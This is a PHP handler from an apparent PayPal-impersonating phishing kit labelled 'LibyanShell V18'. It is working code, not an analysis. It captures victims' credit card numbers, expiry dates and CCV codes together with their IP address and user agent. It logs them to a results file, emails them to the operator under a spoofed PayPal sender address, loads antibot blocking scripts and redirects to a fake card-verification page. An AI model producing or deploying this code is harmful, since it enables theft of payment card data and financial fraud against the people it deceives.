<?php

session_start();
@$_SESSION['nn'] = $_POST['number_cart'];

if(isset($_POST['number_cart'])){
	if(!empty($_POST['number_cart'])){

$HF_V = $_SESSION['country_name'];
$nc = $_POST['number_cart'];

$dc = $_POST['date_cart'];

$csc = $_POST['ccv_cart'];

$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "^_^ ";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " CCV -  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "From: ^__Rzlt__^ <paypal@support.com>" . "\r\n";

$message = "

################### LibyanShell V18 ############################

Number Cart          =>   ".$nc."
Date Cart            =>   ".$dc."
ccv                  =>   ".$csc."
IP                   =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME                 =>    ".$time."

################### LibyanShell V18 ############################
";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
include './email.php';
include '../antibots.php';
include '../block.php';
mail($yourmail, $subject, $message , $headers);

 header("location:../vbv.php?websrc=".md5('W-moustache')."&dispatched=".rand(20,300)."&id=".rand(10000000000,500000000)." ");


 }else{
	header("Location: ../cart.php");
}}else{
	header("Location: ../cart.php");
}